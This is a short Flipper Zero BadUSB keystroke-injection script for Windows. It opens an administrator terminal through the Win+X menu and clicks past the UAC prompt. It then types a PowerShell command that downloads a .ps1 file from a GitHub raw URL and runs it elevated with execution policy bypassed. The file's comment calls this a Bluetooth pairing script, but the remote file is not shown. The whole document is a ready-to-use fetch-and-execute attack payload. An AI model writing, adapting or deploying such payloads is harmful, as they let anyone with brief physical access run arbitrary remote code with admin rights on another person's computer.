REM Simple BadUSB Payload for Flipper Zero
REM Downloads and runs the Bluetooth pairing script with admin privileges

DELAY 2000
GUI x
DELAY 1000
A
DELAY 500
LEFT
DELAY 500
ENTER
DELAY 2000
STRING powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_bt/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File C:\temp\badkb.ps1' -Verb RunAs"
ENTER
DELAY 1000
